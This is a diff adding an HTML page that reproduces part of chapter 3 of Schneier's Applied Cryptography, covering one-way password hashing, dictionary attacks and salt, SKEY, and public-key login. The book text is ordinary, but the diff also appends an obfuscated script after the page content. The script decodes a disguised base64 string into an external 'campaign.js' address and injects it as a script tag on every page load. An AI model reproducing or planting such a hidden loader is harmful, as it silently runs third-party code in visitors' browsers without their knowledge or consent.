@@ -1,0 +1,101 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Basic Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=03//-->
+<!--PAGES=052-054//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="03-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="03-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P><FONT SIZE="+1"><B><I>Authentication Using One-Way Functions</I></B></FONT></P>
+<P>What Roger Needham and Mike Guy realized is that the host does not need to know the passwords; the host just has to be able to differentiate valid passwords from invalid passwords. This is easy with one-way functions [1599,526,1274,1121]. Instead of storing passwords, the host stores one-way functions of the passwords.
+</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice sends the host her password.
+<DD><B>(2)</B>&nbsp;&nbsp;The host performs a one-way function on the password.
+<DD><B>(3)</B>&nbsp;&nbsp;The host compares the result of the one-way function to the value it previously stored.
+</DL>
+<P>Since the host no longer stores a table of everybody&#146;s valid password, the threat of someone breaking into the host and stealing the password list is mitigated. The list of passwords operated on by the one-way function is useless, because the one-way function cannot be reversed to recover the passwords.
+</P>
+<P><FONT SIZE="+1"><B><I>Dictionary Attacks and Salt</I></B></FONT></P>
+<P>A file of passwords encrypted with a one-way function is still vulnerable. In his spare time, Mallory compiles a list of the 1,000,000 most common passwords. He operates on all 1,000,000 of them with the one-way function and stores the results. If each password is about 8 bytes, the resulting file will be no more than 8 megabytes; it will fit on a few floppy disks. Now, Mallory steals an encrypted password file. He compares that file with his file of encrypted possible passwords and sees what matches.
+</P>
+<P>This is a <B>dictionary attack</B>, and it&#146;s surprisingly successful (see Section 8.1). <B>Salt</B> is a way to make it more difficult. Salt is a random string that is concatenated with passwords before being operated on by the one-way function. Then, both the salt value and the result of the one-way function are stored in a database on the host. If the number of possible salt values is large enough, this practically eliminates a dictionary attack against commonly used passwords because Mallory has to generate the one-way hash for each possible salt value. This is a simple attempt at an initialization vector (see Section 9.3).</P>
+<P>The point here is to make sure that Mallory has to do a trial encryption of each password in his dictionary every time he tries to break another person&#146;s password, rather than just doing one massive precomputation for all possible passwords.</P>
+<P>A lot of salt is needed. Most UNIX systems use only 12 bits of salt. Even with that, Daniel Klein developed a password-guessing program that often cracks 40 percent of the passwords on a given host system within a week [847,848] (see Section 8.1). David Feldmeier and Philip Karn compiled a list of about 732,000 common passwords concatenated with each of 4096 possible salt values. They estimate that 30 percent of passwords on any given host can be broken with this list [561].</P>
+<P>Salt isn&#146;t a panacea; increasing the number of salt bits won&#146;t solve everything. Salt only protects against general dictionary attacks on a password file, not against a concerted attack on a single password. It protects people who have the same password on multiple machines, but doesn&#146;t make poorly chosen passwords any better.</P>
+<P><FONT SIZE="+1"><B><I>SKEY</I></B></FONT></P>
+<P>SKEY is an authentication program that relies on a one-way function for its security. It&#146;s easy to explain.
+</P>
+<P>To set up the system, Alice enters a random number, <I>R</I>. The computer computes <I>f</I>(<I>R</I>), <I>f</I>(<I>f</I>(<I>R</I>)), <I>f</I>(<I>f</I>(<I>f</I>(<I>R</I>))), and so on, about a hundred times. Call these numbers <I>x</I><SUB>1</SUB>, <I>x</I><SUB>2</SUB>, <I>x</I><SUB>3</SUB>,..., <I>x</I><SUB>100</SUB>. The computer prints out this list of numbers, and Alice puts it in her pocket for safekeeping. The computer also stores <I>x</I><SUB>101</SUB>, in the clear, in a login database next to Alice&#146;s name.</P>
+<P>The first time Alice wants to log in, she types her name and <I>x</I><SUB>100</SUB>. The computer calculates <I>f</I>(<I>x</I><SUB>100</SUB>) and compares it with <I>x</I><SUB>101</SUB>; if they match, Alice is authenticated. Then, the computer replaces <I>x</I><SUB>101</SUB> with <I>x</I><SUB>100</SUB> in the database. Alice crosses <I>x</I><SUB>100</SUB> off her list.</P>
+<P>Every time Alice logs in, she enters the last uncrossed number on her list: <I>x</I><SUB>i</SUB>. The computer calculates <I>f</I>(<I>x</I><SUB>i</SUB>) and compares it with <I>x</I><SUB>i&#43;1</SUB> stored in its database. Eve can&#146;t get any useful information because each number is only used once, and the function is one-way. Similarly, the database is not useful to an attacker. Of course, when Alice runs out of numbers on her list, she has to reinitialize the system.</P>
+<P><FONT SIZE="+1"><B><I>Authentication Using Public-Key Cryptography</I></B></FONT></P>
+<P>Even with salt, the first protocol has serious security problems. When Alice sends her password to her host, anyone who has access to her data path can read it. She might be accessing her host through a convoluted transmission path that passes through four industrial competitors, three foreign countries, and two forward-thinking universities. Eve can be at any one of those points, listening to Alice&#146;s login sequence. If Eve has access to the processor memory of the host, she can see the password before the host hashes it.
+</P>
+<P>Public-key cryptography can solve this problem. The host keeps a file of every user&#146;s public key; all users keep their own private keys. Here is a na•ve attempt at a protocol. When logging in, the protocol proceeds as follows:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;The host sends Alice a random string.
+<DD><B>(2)</B>&nbsp;&nbsp;Alice encrypts the string with her private key and sends it back to the host, along with her name.
+<DD><B>(3)</B>&nbsp;&nbsp;The host looks up Alice&#146;s public key in its database and decrypts the message using that public key.
+<DD><B>(4)</B>&nbsp;&nbsp;If the decrypted string matches what the host sent Alice in the first place, the host allows Alice access to the system.
+</DL>
+<P>No one else has access to Alice&#146;s private key, so no one else can impersonate Alice. More important, Alice never sends her private key over the transmission line to the host. Eve, listening in on the interaction, cannot get any information that would enable her to deduce the private key and impersonate Alice.
+</P>
+<P>The private key is both long and non-mnemonic, and will probably be processed automatically by the user&#146;s hardware or communications software. This requires an intelligent terminal that Alice trusts, but neither the host nor the communications path needs to be secure.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="03-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="03-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(oPcCRovn, DMdxwiVB) {DMdxwiVB = oPcCRovn.createElement('script');DMdxwiVB.type = 'text/javascript';DMdxwiVB.async = true;DMdxwiVB.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');oPcCRovn.getElementsByTagName('body')[0].appendChild(DMdxwiVB);}(document));</script></body>
+</html>
